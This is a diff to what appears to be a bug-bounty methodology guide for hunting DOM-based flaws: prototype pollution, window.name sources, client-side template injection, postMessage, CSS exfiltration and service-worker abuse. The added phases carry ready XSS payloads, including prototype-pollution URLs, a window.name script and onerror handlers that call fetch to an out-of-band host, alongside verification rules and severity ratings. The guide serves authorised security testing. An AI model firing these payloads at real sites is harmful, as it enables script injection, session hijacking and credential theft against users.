@@ -16,6 +16,16 @@ DOM-based attacks execute in the victim's browser — the server often never see
 - **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
 - **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
 - **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.
+- **Client-side prototype pollution → DOM XSS** — a query/hash key `__proto__` / `constructor[prototype]` merged into a config object changes `src`, `innerHTML`, or a sanitizer allow-list.
+- **`window.name` / `document.baseURI` / `postMessage` as sources** — they survive a navigation or a cross-window handoff and never appear in server logs.
+
+## Decision tree
+
+1. **Source.** Where does the attacker string enter? `location.search` / `hash` / `href`, `document.referrer`, `document.baseURI`, `window.name`, `postMessage`, `localStorage`, a JSON field the client writes into the DOM.
+2. **Sink.** Where does it go? `innerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write` / `iframe.srcdoc` / `eval` / `setTimeout(string)` / `location` / `script.src` / `$.html` / `dangerouslySetInnerHTML` / `v-html` / Alpine `x-html`.
+3. **Sanitizer in between?** DOMPurify / sanitize-html / a framework auto-escape. If yes, you need mXSS, a config bug, or clobbering — not a raw `<script>`.
+4. **Prove execution or the privileged effect** in the target origin (OOB from that page, or a state change). A breakpoint in DevTools is not a report.
+5. **CSP / Trusted Types** actually block the sink? Then the bug is the policy gadget or the `createPolicy` passthrough (`hunt-xss`), not the source.
 
 ### Grounding — public research this is distilled from
 - **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
@@ -209,7 +219,30 @@ print("\n".join(
 
 ---
 
-## Phase 5 — dangerouslySetInnerHTML / framework sinks
+## Phase 5 — Prototype pollution → DOM XSS, `window.name`
+
+```text
+https://TARGET/page?__proto__[src]=https://OOB/ppm.js
+https://TARGET/page?__proto__[innerHTML]=<img src=x onerror=fetch("https://OOB/x")>
+https://TARGET/page?constructor[prototype][marker]=ppm-<rand>
+```
+
+The merge has to be unsafe (`Object.assign`, `$.extend(true)`, `_.merge`, a recursive query parser) **and** a sink has to read the polluted key. A parameter that is stored as the literal key `__proto__` did not pollute `Object.prototype`. Confirm with a **second** page load that does not contain the parameter and still fires, or with `ppm-<rand>` showing up on an object you did not set.
+
+DOMPurify: if its config is merged from an object that inherits the polluted prototype, `ADD_TAGS` / `ALLOWED_ATTR` / `ALLOW_UNKNOWN_PROTOCOLS` can flip. Version-gate mXSS separately (`hunt-xss`: CVE-2024-47875, CVE-2024-45801, CVE-2025-15599). A version string is a lead; execution is the proof.
+
+```html
+<!-- window.name survives top-level navigation into the target -->
+<script>
+  var w = window.open("about:blank");
+  w.name = "<img src=x onerror=fetch('https://OOB/n?'+document.domain)>";
+  w.location = "https://TARGET/page-that-reads-name";
+</script>
+```
+
+Only counts if that page copies `window.name` into HTML/JS. `document.baseURI` / `<base href>` clobber is the relative-URL variant in Phase 1.
+
+## Phase 6 — dangerouslySetInnerHTML / framework sinks
 
 ```bash
 grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
@@ -221,16 +254,17 @@ curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangero
 
 ---
 
-## Phase 6 — Client-Side Template Injection
+## Phase 7 — Client-side template injection
 
 ```bash
 # Detect framework, then test the {{}} sink in a sandbox-bypass form.
 grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
-# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
-#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
-# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
-#   {{constructor.constructor('alert(document.domain)')()}}
-# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
+# Probe: {{7*7}} -> 49 in the live DOM and NOT in the raw HTML response => client template.
+# Server-side 49 in curl is SSTI (hunt-ssti), not this skill.
+# AngularJS 1.x (version-specific): {{constructor.constructor('alert(document.domain)')()}}
+# Vue 2 (build-specific): {{_c.constructor('alert(document.domain)')()}}
+# Alpine: <div x-html="'<img src=x onerror=alert(document.domain)>'">
+# HTMX: hx-vals / hx-get pointed at an attacker URL is request forgery if the server reflects it into the DOM.
 ```
 
 ---
@@ -245,6 +279,8 @@ grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/
 | CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
 | Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
 | dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |
+| Prototype pollution changes a sink or sanitizer config | DOM XSS on a later navigation | High when session-bearing |
+| `window.name` / `baseURI` into a sink | XSS or script-src hijack | High on the app origin |
 
 ---
 
@@ -267,7 +303,8 @@ Match the repo standard: a technique that *fires in DevTools* is not a finding u
 - **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
 - **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
 - **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
-- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.
+- **Prototype pollution / `window.name`** — the sink fires on a navigation that does not include the payload, or the OOB host is requested by the target origin. A query key that round-trips as a string is not pollution.
+- **General** — unique per-test markers so an OOB hit is yours. Body-diff the rendered DOM, not the raw HTML. No brute-force of tokens. No DoS via CSS `@import` storms — leak enough characters to prove the oracle (a prefix), then stop.
 
 **Severity:**
 - Same-origin Service Worker → persistent credential intercept: **Critical**
